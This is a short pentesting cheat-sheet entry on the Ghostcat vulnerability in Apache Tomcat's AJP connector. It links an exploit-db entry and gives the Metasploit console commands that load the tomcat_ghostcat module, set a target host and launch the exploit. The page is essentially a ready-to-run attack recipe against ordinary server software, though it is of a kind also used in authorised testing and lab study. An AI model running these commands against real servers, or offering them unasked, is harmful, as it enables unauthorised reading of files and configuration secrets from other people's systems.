---
title: Ghostcat
desc: A severe vulnerability in Tomcat AJP (Apache JServ Protocol).
tags: [AJP, Web]
alts: []
website: https://www.exploit-db.com/exploits/49039
render_with_liquid: false
---

## Metasploit

```sh
msfconsole
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts <target-ip>
msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
```